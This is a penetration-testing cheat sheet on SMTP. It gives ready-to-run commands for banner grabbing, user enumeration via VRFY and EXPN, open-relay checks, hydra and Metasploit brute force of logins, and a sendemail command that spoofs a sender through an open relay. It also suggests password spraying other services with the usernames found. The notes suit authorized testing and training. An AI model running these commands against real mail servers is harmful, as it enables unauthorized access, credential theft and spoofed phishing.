```table-of-contents
```

!!! tip "Start here"
    Enumerate users via VRFY: `smtp-user-enum -M VRFY -U users.txt -t <target>`. If VRFY is disabled, try EXPN or RCPT TO. User enumeration gives you a valid username list for password spraying against other services (SMB, WinRM, RDP).

## Enumeration
### Banner Grabbing
```bash
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay <target-ip>
```

```bash
nc -nv <target-ip> <25,587>
```

Cross reference the version for vulnerabilities in exploit-DB.

## Enumerate SMTP Users
```bash
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} <target-ip>
```

- **VRFY**: Verify if a user exists.
- **EXPN**: Expand mailing lists, potentially revealing email addresses.

Metasploit:
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target-ip>
run
```

## Open Relaying (Unauthenticated Email Sending)
```bash
nmap --script smtp-open-relay -p 25,465,587 <target-ip>
```

## Brute-Force SMTP Authentication
```bash
hydra -L users.txt -P passwords.txt -s 25 <target-ip> smtp
```

Metasploit:
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## SMTP Open Relay
An **Open Relay** allows sending email from any domain without authentication. Attackers commonly exploit this to send spam, phishing emails, or spoof messages.
```bash
nmap -p25 --script smtp-open-relay <target-ip>
```

## Exploiting Misconfigurations
If you confirm an open relay exists, you can send spoofed emails using command-line tools:
Using `sendemail`:
```bash
sendemail -f spoofed@example.com -t victim@target.com -s <target-ip>:25 -u "Subject Here" -m "Your message here."
```

- `-f`: Sender email address (spoofed).
- `-t`: Recipient.
- `-s`: SMTP server IP and port.